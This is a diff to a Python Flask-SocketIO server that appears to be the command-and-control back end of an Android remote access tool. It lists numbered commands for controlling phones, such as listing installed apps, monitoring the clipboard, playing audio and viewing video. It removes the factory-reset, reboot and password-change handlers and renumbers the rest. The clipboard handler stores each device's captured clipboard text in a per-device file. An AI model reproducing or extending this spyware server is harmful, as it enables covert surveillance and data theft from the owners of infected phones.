@@ -26,12 +26,9 @@ socketio = SocketIO(app)
 0xC - List Installed Apps
 0xD - Vibrate Phone
 0xE - Change Wallpaper
-0xF - Factory Reset Device
-0x10 - Reboot Device
-0x11 - Change Device Password
-0x12 - Clipboard Monitoring
-0x13 - Play Audio
-0x14 - Video View
+0xF - Clipboard Monitoring
+0x10 - Play Audio
+0x11 - Video View
 '''
 
 def write_to_log_file(data):
@@ -222,33 +219,18 @@ def change_wallpaper_listener(data):
 
 
 @socketio.on('0xF')
-def factory_listener_listener(data):
-    log_to_console(data)
-
-
-@socketio.on('0x10')
-def reboot_device_listener(data):
-    log_to_console(data)
-
-
-@socketio.on('0x11')
-def change_device_passowrd_listener(data):
-    log_to_console(data)
-
-
-@socketio.on('0x12')
 def clipboard_monitoring(data):
     with open(f"files/{data['device_id']}/clipboard.txt", 'a') as f:
         f.write(data['clip'])
     log_to_console(data)
 
 
-@socketio.on('0x13')
+@socketio.on('0x10')
 def play_audio(data):
     log_to_console(data)
 
 
-@socketio.on('0x14')
+@socketio.on('0x11')
 def vidoe_view(data):
     log_to_console(data)
 
